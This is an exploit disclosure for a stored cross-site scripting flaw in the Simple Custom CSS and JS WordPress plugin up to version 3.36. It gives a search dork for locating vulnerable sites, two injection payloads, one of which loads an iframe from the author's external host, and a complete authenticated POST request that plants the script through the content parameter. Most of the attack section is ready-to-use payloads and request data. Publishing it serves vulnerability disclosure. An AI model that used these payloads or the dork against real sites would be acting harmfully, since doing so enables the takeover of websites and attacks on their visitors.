/*!
- # VULNERABILITY: Simple Custom CSS and JS WordPress Plugin <= 3.36 - Authenticated Persistent XSS
- # GOOGLE DORK: inurl:/wp-content/plugins/custom-css-js/
- # DATE: 2021-05-22
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: SilkyPress.com [ https://www.silkypress.com ]
- # SOFTWARE VERSION: <= 3.36
- # SOFTWARE LINK: https://wordpress.org/plugins/custom-css-js/
- # CVSS: 3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS vulnerability was discovered in the Simple Custom CSS and JS plugin through v3.36 for WordPress.

[i] Vulnerable parameter(s): &content=.

[i] Payload with closing tag </textarea> will break the content text box and trigger JS payload or iFrame.



### -- [ Impact: ]

[~] Malicious JavaScript code and iFrame injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] </script></style></textarea><script>alert(document.domain);</script>

[$] </script></style></textarea><iframe src=https://m0ze.ru/payload/xfsii.html></iframe>



### -- [ PoC | Authenticated Persistent XSS | Add Custom JS / Add Custom CSS / Add Custom HTML: ]

[!] POST /wp-admin/post.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 1433

_wpnonce=45ca7fa1fc&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D168%26action%3Dedit%26message%3D1&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=custom-css-js&original_post_status=publish&referredby=https%3A%2F%2Fexample.com%2Fwp-admin%2Fpost.php%3Fpost%3D168%26action%3Dedit&_wp_original_http_referer=https%3A%2F%2Fexample.com%2Fwp-admin%2Fpost.php%3Fpost%3D168%26action%3Dedit&post_ID=168&meta-box-order-nonce=10faeebc6a&closedpostboxesnonce=ae5d307e0d&post_title=PoC&ccj-permalink-nonce=830ea5d3e5&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D168%26action%3Dedit%26message%3D1&samplepermalinknonce=be0abd3537&fullscreen=false&content=%3C%2Fscript%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E&hidden_post_status=publish&post_status=publish&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=05&jj=19&aa=2021&hh=18&mn=37&ss=39&hidden_mm=05&cur_mm=05&hidden_jj=19&cur_jj=25&hidden_aa=2021&cur_aa=2021&hidden_hh=18&cur_hh=20&hidden_mn=37&cur_mn=08&original_publish=Update&save=Update&custom-css-js_meta_box_nonce=e38f116e34&_wp_http_referer=%2Fwp-admin%2Fpost.php%3Fpost%3D168%26action%3Dedit%26message%3D1&custom_code_linking=internal&custom_code_type=header&custom_code_side=frontend&custom_code_priority=5&custom_code_language=js&scan_anchor_filters=%5B%7B%22value%22%3A%22%22%2C%22type%22%3A%22all%22%2C%22index%22%3A1%7D%5D



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
